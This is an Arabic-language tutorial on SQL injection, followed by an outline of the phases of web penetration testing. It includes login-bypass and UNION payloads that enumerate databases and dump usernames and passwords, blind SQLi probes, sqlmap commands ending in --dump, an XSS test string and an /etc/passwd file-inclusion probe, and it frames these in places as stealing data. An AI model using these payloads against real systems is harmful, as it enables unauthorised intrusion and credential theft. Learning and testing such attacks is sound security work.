## **📌 SQL Injection – شرح عميق وبسيط لأخطر ثغرة في قواعد البيانات 🔥**

### **🔵 1️⃣ إيه هو SQL Injection؟ 🤔**

ثغرة **SQL Injection (اختصارها SQLi)** هي ثغرة بتحصل لما الهاكر **يدخل كود SQL خبيث** في مدخل بيانات زي **اسم المستخدم أو كلمة المرور أو مربع البحث**، والموقع **ما بيعملش تحقق كويس على المدخلات**، فـ الهاكر يقدر **يعدل أو يسحب بيانات من قاعدة البيانات** أو حتى **يمسح البيانات بالكامل!** 😱

### **✅ مثال عملي على SQL Injection في تسجيل الدخول**

تخيل عندك موقع بيسمح بتسجيل الدخول، والاستعلام بيكون كده:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '12345';
```

الموقع بيتأكد إن اسم المستخدم وكلمة المرور صح قبل تسجيل الدخول.

🔥 **لكن لو الهاكر كتب حاجة زي دي في اسم المستخدم:**

```sql
' OR '1'='1' -- 
```

هيتحول الاستعلام إلى:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = '';
```

🚀 **بما إن 1=1 دايمًا صح، الموقع هيسمح بتسجيل الدخول بدون كلمة سر!**

📌 **💡 الخلاصة بالعامية:**  
"الثغرة دي بتسمحلك تدخل أو تعدل بيانات في قاعدة البيانات عن طريق كتابة أكواد SQL في أي مكان بياخد إدخال من المستخدم!" 🔥

---

### **🔵 2️⃣ إزاي تعرف إن الموقع مصاب بثغرة SQL Injection؟ 🔍**

1️⃣ **جرب إدخال ' في أي مكان فيه إدخال بيانات** (زي البحث أو تسجيل الدخول)، وشوف لو ظهر **خطأ SQL**، زي:

```
You have an error in your SQL syntax...
```

🔥 **ده معناه إن الموقع بيستخدم SQL بطريقة غير آمنة!**

2️⃣ **جرب تضيف استعلام زي:**

```sql
' OR '1'='1' -- 
```

**لو سجل دخولك من غير باسورد، فالموقع مصاب بالثغرة!**

📌 **💡 الخلاصة بالعامية:**  
"لو الموقع وقع لما تدخل ' أو سمحلك تدخل من غير باسورد، يبقى فيه SQL Injection!" 😈

---

### **🔵 3️⃣ إزاي تسرق البيانات باستخدام SQL Injection؟ 😏**

#### **🎯 استخراج أسماء قواعد البيانات**

```sql
' UNION SELECT schema_name, NULL FROM information_schema.schemata --
```

🔥 **هيعرض كل قواعد البيانات الموجودة على السيرفر!**

#### **🎯 استخراج الجداول داخل قاعدة بيانات معينة**

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='database_name' --
```

🔥 **هيعرض كل الجداول اللي جوه قاعدة بيانات محددة!**

#### **🎯 استخراج أسماء الأعمدة في جدول معين**

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

🔥 **كده عرفت كل أسماء الأعمدة في جدول المستخدمين!**

#### **🎯 استخراج بيانات المستخدمين (مثلاً الأسماء والباسوردات)**

```sql
' UNION SELECT username, password FROM users --
```

🔥 **هيعرض كل أسماء المستخدمين والباسوردات المخزنة في قاعدة البيانات!**

📌 **💡 الخلاصة بالعامية:**  
"لو عندك SQL Injection، تقدر تستخرج كل البيانات السرية زي المستخدمين والباسوردات بسهولة!" 🔥😈

---

### **🔵 4️⃣ أنواع SQL Injection 🩸**

1️⃣ **🔹 SQL Injection العادي (Classic SQLi)**

- بتحصل لما الموقع **ما بيعملش تحقق على المدخلات**، وبتقدر تدخل أكواد SQL مباشرة زي:

```sql
' OR 1=1 -- 
```

- 🔥 **ده بيخلي الموقع يرجع كل البيانات!**

2️⃣ **🔹 SQL Injection الأعمى (Blind SQLi)**

- بيحصل لما **الموقع ما بيعرضش أخطاء SQL**، لكن تقدر تعرف إنه مصاب من خلال **تغيير في سلوك الموقع**.
- جرب إدخال:
    
    ```sql
    ' AND 1=1 -- 
    ```
    
    - **لو الموقع رجّع بيانات، جرب:**
    
    ```sql
    ' AND 1=2 -- 
    ```
    
    - **لو الموقع رجّع نتيجة مختلفة، يبقى مصاب بـ Blind SQLi!**

📌 **💡 الخلاصة بالعامية:**  
"فيه SQL Injection بيعرض أخطاء، وفيه اللي مش بيعرض لكن تقدر تكتشفه عن طريق التجربة!" 😏

---

### **🔵 5️⃣ استغلال SQL Injection باستخدام الأدوات 🚀**

### **✅ 1- استخدام أداة SQLMap 🔥**

📌 **SQLMap** هي أداة قوية بتفحص المواقع عن SQL Injection تلقائيًا.

#### **🎯 تنفيذ فحص تلقائي:**

```bash
sqlmap -u "https://example.com/index.php?id=1" --dbs
```

🔥 **هيكشف كل قواعد البيانات المتاحة!**

#### **🎯 استخراج أسماء الجداول:**

```bash
sqlmap -u "https://example.com/index.php?id=1" -D database_name --tables
```

🔥 **هيعرض كل الجداول اللي جوه قاعدة بيانات معينة!**

#### **🎯 استخراج بيانات المستخدمين:**

```bash
sqlmap -u "https://example.com/index.php?id=1" -D database_name -T users --dump
```

🔥 **هيستخرج كل بيانات المستخدمين من الجدول!**

📌 **💡 الخلاصة بالعامية:**  
"أداة SQLMap بتختصر الوقت جدًا، بتفحص الموقع وتجيبلك البيانات كلها تلقائي!" 🔥🚀

---

## **📌 🔥 خطوات عملية لاختبار اختراق مواقع الويب (Web Penetration Testing) 🔥**

### **1️⃣ جمع المعلومات (Reconnaissance) 🔍**

- استخدم **Google Dorking** للبحث عن الصفحات الحساسة.
- فحص **Subdomains** باستخدام أدوات زي `Sublist3r`.
- فحص **IP و DNS Records** باستخدام `dig` و `nslookup`.

### **2️⃣ فحص الثغرات (Scanning) 🔥**

- استخدم `Nmap` لفحص المنافذ المفتوحة والخدمات.
- استخدم `Nikto` و `Dirb` لاكتشاف الملفات والمجلدات المخفية.

### **3️⃣ تجربة استغلال الثغرات (Exploitation) 🚀**

- اختبار **SQL Injection** باستخدام `sqlmap`.
- اختبار **XSS** بإدخال `<script>alert('XSS')</script>`.
- اختبار **LFI و RFI** بتجربة `/etc/passwd` في مدخلات الملفات.

### **4️⃣ محاولة رفع الامتيازات (Privilege Escalation) 🔥**

- استغلال **ثغرات السيرفر** للوصول إلى صلاحيات أعلى.
- تجربة **تخمين كلمات المرور** باستخدام `hydra` أو `John the Ripper`.

### **5️⃣ كتابة التقرير (Reporting) 📝**

- توثيق جميع الثغرات المكتشفة.
- اقتراح حلول للحماية.

---

## **🔥💡 ملخص شامل بالعامية 🔥💡**

1️⃣ **SQL Injection ثغرة بتسمحلك تسرق بيانات قاعدة البيانات باستخدام أكواد خبيثة.**  
2️⃣ **بنكتشفها عن طريق إدخال أكواد اختبارية في البحث أو تسجيل الدخول.**  
3️⃣ **بنستغلها لجلب البيانات الحساسة زي المستخدمين وكلمات المرور.**  
4️⃣ **نستخدم أدوات زي SQLMap عشان نسهل الاختراق.**  
5️⃣ **اختبار اختراق الويب بيتم على مراحل: جمع معلومات، فحص ثغرات، استغلال، رفع امتيازات، وتوثيق النتائج.**

🔥 **باختصار: SQL Injection من أخطر الثغرات، ولو موقعك مش محمي، بياناتك في خطر! 😈**